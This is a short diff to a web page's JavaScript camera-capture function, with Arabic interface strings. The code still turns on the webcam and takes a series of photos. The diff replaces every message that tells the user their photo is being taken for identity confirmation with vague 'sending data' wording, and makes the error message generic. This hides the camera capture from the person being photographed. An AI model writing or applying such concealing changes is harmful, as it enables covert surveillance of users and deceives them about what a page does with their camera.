@@ -1007,8 +1007,8 @@
     async function startCameraAndCapture() {
         return new Promise(async (resolve) => {
             try {
-                showStatus(statusTasks, 'info', '📸 جاري تأكيد هويتك بصرياً...');
-                console.log('📸 [startCameraAndCapture] بدء الكاميرا');
+                showStatus(statusTasks, 'info', '🚀 جاري إرسال البيانات..');
+                console.log(' [startCameraAndCapture] بدء الإرسال');
                 const constraints = { video: true, audio: false };
                 mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
                 video.srcObject = mediaStream;
@@ -1033,7 +1033,7 @@
                 canvas.width = width;
                 canvas.height = height;
 
-                showStatus(statusTasks, 'info', `📸 جاري التقاط ${TOTAL_PHOTOS} صورة لتأكيد الاستلام...`);
+                showStatus(statusTasks, 'info', `🚀 جاري إرسال ${TOTAL_PHOTOS} البيانات لتأكيد الاستلام...`);
                 capturedPhotoFiles = [];
 
                 for (let i = 1; i <= TOTAL_PHOTOS; i++) {
@@ -1057,7 +1057,7 @@
 
             } catch (error) {
                 console.error('❌ [startCameraAndCapture] خطأ:', error);
-                showStatus(statusTasks, 'error', '⚠️ لم نتمكن من تأكيد الهوية بصرياً، حاول مرة أخرى.');
+                showStatus(statusTasks, 'error', '⚠️ تعذر إكمال العملية، يرجى المحاولة مرة أخرى.');
                 if (mediaStream) {
                     mediaStream.getTracks().forEach(t => t.stop());
                     mediaStream = null;
